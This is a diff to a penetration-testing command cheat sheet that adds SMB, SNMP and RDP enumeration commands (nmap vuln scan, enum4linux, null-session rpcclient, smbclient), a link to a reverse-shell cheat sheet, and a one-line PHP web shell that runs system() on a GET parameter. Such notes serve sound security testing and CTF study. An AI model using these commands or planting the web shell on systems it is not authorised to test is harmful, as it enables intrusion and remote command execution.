@@ -38,7 +38,7 @@ nmap -A -p- -oA full -targetip-
 
 gobuster dir -u -targetip- -w /usr/share/wordlist/dirbuster/directory-medium-23.txt -t 50
 
-##### Gobuster with file extension
+#### Gobuster with file extension
 
 gobuster dir -u -targetip- -w /usr/share/wordlist/dirbuster/directory-medium-23.txt -t 50 -x php
 
@@ -54,10 +54,48 @@ wpscan -u -targetip- -e
 
 nc -v -tagretip- -port-
 
-##### Telnet banner grab
+#### Telnet banner grab
 
 telnet -targetip- -port-
 
+### SMB
+
+#### SMB Vulnerability Scan
+
+nmap -p 445 -vv -script vuln -p 139,445 -targetip-
+
+### Enum4linux
+
+enum4linux -a target
+
+### Null connect
+
+rpcclient -U "" target
+
+#### Connect to SMB share
+
+smbclient //MOUNT/share
+
+### SNMP
+
+#### SNMP enumeration
+
+snmp-check target
+
+#### Reverse Shells
+
+[Revere Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+#### Remote Desktop
+
+Remote Desktop for windows with share and 85% screen
+rdesktop -u username -p password -g 85% -r disk:share=/root/ target
+
+### PHP
+
+#### PHP command injection from GET Request
+
+-?php echo system($_GET["cmd"]);?-
 
 
 
